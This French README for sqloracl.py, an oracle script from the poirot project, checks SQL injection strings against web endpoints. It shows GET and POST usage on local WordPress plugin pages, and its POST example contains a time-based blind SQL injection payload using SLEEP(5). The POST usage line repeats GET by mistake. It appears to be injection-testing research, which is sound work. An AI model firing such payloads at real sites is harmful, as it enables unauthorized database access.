# oracleSQL
pour PFGimenez/poirot
## Utilisation
retourne 0 si la chaine de caractère est syntaxiquement valide, 1 sinon
#### GET
```
python sqloracl.py [url](string) GET [payload](dict /!\ clés et valeurs entre SIMPLES quotes) [param](string) [injtext](string /!\ entre DOUBLES quotes)
```
exemple :
```
python sqloracl.py http://localhost/injections/wordp/wp-admin/wp-admin/admin.php GET {'action':'dt_duplicate_post_as_draft','post':''} post ""
```
#### POST
```
python sqloracl.py [url](string) GET [payload](dict /!\ clés et valeurs entre SIMPLES quotes) [param](string) [injtext](string /!\ entre DOUBLES quotes)
```
exemple :
```
python sqloracl.py http://localhost/injections/wordp/wp-admin/admin-ajax.php POST {'action':'spAjaxResults','pollid':'2'} pollid " AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"
```